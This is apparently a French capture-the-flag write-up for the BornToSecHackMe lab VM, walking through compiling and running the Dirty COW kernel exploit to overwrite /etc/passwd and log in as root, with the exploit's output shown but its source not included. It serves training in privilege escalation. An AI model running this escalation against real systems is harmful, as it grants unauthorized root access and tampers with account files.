#### I - Se connecter en SSH
- Suivre le writeup1 jusqu'a l'etape Laurie SSH

----

#### II - Creer le script

``nano dirtycow.c`
- Copier coller le code present dans /scripts/dirtycow

- Compiler l'exploit
``gcc dirtycow.c -lpthread -lcrypt``

----

#### III - Lancer le script

- Lancer l'exploit
``./a.out``

>/etc/passwd successfully backed up to /tmp/passwd.bak
>Please enter the new password: (**SAISIR LE NOUVEAU MDP ICI**)
>Complete line:
>root:XXXXXXXXX:pwned:/root:/bin/bash **(ou XXXXXXXXX est la version cryptee du mdp choisi)**
>mmap: b7fda000
>madvise 0
>ptrace 0
>Done! Check /etc/passwd to see if the new user was created.
>You can log in with the username 'root' and the password 'XXXXXXXXX'. **(ou XXXXXXXXX est le mdp choisi)**
>DON'T FORGET TO RESTORE! \$ mv /tmp/passwd.bak /etc/passwd
>Done! Check /etc/passwd to see if the new user was created.
>You can log in with the username 'root' and the password 'XXXXXXXXX'. **(ou XXXXXXXXX est le mdp choisi)**
>DON'T FORGET TO RESTORE! \$ mv /tmp/passwd.bak /etc/passwd

----

#### IV - Se connecter en root

``su root``
>Password:
>root@BornToSecHackMe:/home/zaz#
